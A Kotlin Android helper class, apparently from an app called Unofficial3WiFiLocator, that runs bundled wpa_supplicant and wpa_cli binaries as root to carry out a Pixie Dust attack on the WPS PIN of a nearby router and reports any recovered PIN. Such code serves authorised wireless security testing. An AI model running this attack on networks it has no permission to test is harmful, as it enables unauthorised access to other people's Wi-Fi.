package com.example.Unofficial3WiFiLocator

import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.os.SystemClock
import android.util.Log
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.IOException
import java.io.InputStreamReader

class PixieDustHelper(
    private val context: Context,
    private val wifiManager: WifiManager,
    private val listener: PixieDustListener
) {

    private lateinit var wpaCliProcess: Process
    private lateinit var pixieDustProcess: Process
    private var output = ""

    interface PixieDustListener {
        fun onPinFound(pin: String)
        fun onPinNotFound()
        fun onProcessOutput(output: String)
    }

    private fun runPixieDust() {
        val path = if (Build.VERSION.SDK_INT >= 28) {
            " -g/data/vendor/wifi/wpa/3wifilocator/wlan0 "
        } else {
            " -g/data/misc/wifi/3wifilocator/wlan0 "
        }

        val cmd = "( cmdpid=\$BASHPID; (sleep 2; kill \$cmdpid) & exec /data/data/com.example.Unofficial3WiFiLocator/files/wpa_cli_n$path IFNAME=wlan0 wps_reg ${wifiManager.connectionInfo.bssid} 12345670 )"

        try {
            val processBuilder = ProcessBuilder("su")
            val process = processBuilder.start()
            val outputStream = DataOutputStream(process.outputStream)
            outputStream.writeBytes("export LD_LIBRARY_PATH=/data/data/com.example.Unofficial3WiFiLocator/files \n")
            outputStream.writeBytes(cmd)
            outputStream.writeBytes("exit \n")
            outputStream.flush()
            outputStream.close()
            process.waitFor()

            handleOutput(process)
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun handleOutput(process: Process) {
        val reader = BufferedReader(InputStreamReader(process.inputStream))
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            output = line ?: ""
            if (output.contains("not found")) {
                Log.d("PixieDust", "PIN not found")
                listener.onPinNotFound()
            } else if (output.contains("WPS pin")) {
                val pin = output.split(":")[1].trim()
                Log.d("PixieDust", "PIN $pin")
                listener.onPinFound(pin)
                wifiManager.isWifiEnabled = true
                SystemClock.sleep(3000L)
            }
            listener.onProcessOutput(output)
        }
    }

    fun startPixieDust() {
        listener.onProcessOutput("Trying to take PIN using Pixie Dust mode")
        try {
            wpaCliProcess = Runtime.getRuntime().exec("su")
            val outputStream = DataOutputStream(wpaCliProcess.outputStream)
            outputStream.writeBytes("export LD_LIBRARY_PATH=/data/data/com.example.Unofficial3WiFiLocator/files \n")
            outputStream.writeBytes("( cmdpid=\$BASHPID; (sleep 10; kill \$cmdpid) & exec /data/data/com.example.Unofficial3WiFiLocator/files/wpa_supplicant -d -Dnl80211,wext,hostapd,wired -i wlan0 -c/data/data/com.example.Unofficial3WiFiLocator/files/wpa_supplicant.conf -O/data/misc/wifi/3wifilocator/)\n")
            outputStream.writeBytes("exit \n")
            outputStream.flush()
            outputStream.close()
            SystemClock.sleep(2000L)
            runPixieDust()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}
